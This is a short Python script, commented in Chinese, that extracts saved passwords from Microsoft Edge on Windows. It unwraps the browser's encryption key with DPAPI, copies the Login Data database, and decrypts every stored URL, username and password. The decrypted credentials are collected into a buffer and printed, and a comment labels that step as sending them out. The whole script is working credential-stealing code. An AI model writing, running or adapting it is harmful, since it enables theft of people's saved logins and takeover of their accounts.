import base64
import json
import os
import sqlite3
from win32crypt import CryptUnprotectData
import shutil
from Crypto.Cipher import AES

#找到 密钥+密文=解密->密码
#1.找到密钥(key)
edge_data_path = os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data'
text = open(edge_data_path+'\\Local State','r',encoding='utf-8').read()
#print(text)
JSON = json.loads(text)
key = JSON['os_crypt']['encrypted_key']
key = base64.b64decode(key)[5:]
key = CryptUnprotectData(key ,None, None, None, 0)[1]
#print(key)

#2.找到密文()
shutil.copy(edge_data_path+'\\Default\\Login Data', 'Login Data')
conn = sqlite3.connect('Login Data')
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

#3.破解密文
def decode(pwd):
   #pwd = b"v10/\xb3\x8f\xe2\x04`\xa3\xf2\xc6J\xa2.\xde\x8c\x15\xbf\xc4O\x1eI\xec}\x99\xfd\\\xe7\x98\x80\xe6=\xa7\xf1\xb6k\xbbs\x94L"
   iv = pwd[3:15]
   payload = pwd[15:]
   cipher = AES.new(key, AES.MODE_GCM, iv)
   password = cipher.decrypt(payload)
   password = password[:-16].decode()
   return password
#4.发送密文

n=0
buffer = b""
for data in cursor.fetchall():
   url, username, pwd_token = data  # 解包赋值
   pwd = decode(pwd_token)
   buffer+=('('+url+','+username+','+pwd+')\n').encode('utf-8')
   n+=1
buffer+= f'共有{n}个账号和密码'.encode('utf-8')

print(buffer.decode())

